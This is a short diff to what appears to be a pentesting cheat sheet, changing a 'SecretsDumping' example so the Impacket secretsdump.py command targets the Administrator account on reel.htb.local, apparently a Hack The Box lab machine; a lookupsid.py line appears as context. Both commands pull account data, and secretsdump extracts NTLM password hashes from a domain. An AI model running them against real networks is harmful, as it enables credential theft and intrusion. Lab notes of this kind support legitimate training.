@@ -51,5 +51,5 @@ $python3 lookupsid.py <domain/username:password@hostname>
 
 ## SecretsDumping
 ```
-python3 secretsdump.py -just-dc-ntlm <domain>/<username>@10.10.236.46 (when prompted enter password)
+python secretsdump.py htb.local/Administrator@reel.htb.local (enter password when prompted)
 ```
